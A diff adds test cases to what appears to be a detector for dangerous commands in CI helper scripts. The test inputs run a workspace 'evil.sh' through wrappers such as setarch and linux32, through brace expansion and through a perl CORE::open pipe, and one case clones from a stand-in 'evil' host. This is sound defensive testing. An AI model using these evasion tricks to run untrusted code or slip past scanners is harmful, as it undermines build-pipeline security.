@@ -33,6 +33,8 @@ t wrapper-fakeroot 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefa
 t wrapper-xvfb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}xvfb-run bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-prlimit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}prlimit -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-timeout 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}timeout 10 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-setarch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}setarch x86_64 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-linux32 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}linux32 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 
 # --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
 t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
@@ -163,6 +165,9 @@ t varmap-assign-op-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}note=
 # --- predefined shell vars (Codex P1: ${BASH} in argv0) ---
 t varmap-bash 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${BASH}\" \"\${GITHUB_WORKSPACE}/evil.sh\""
 t varmap-shell 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\$SHELL -c true"
+# --- brace expansion in argv0 (Codex P1: {bash,evil.sh}) ---
+t varmap-brace 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}{bash,evil.sh}"
+t varmap-brace-single-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}{a}"
 
 # --- CORE-qualified perl calls (Codex P1: CORE::open) ---
 t perl-core-open 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::open(my \$fh, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\");"
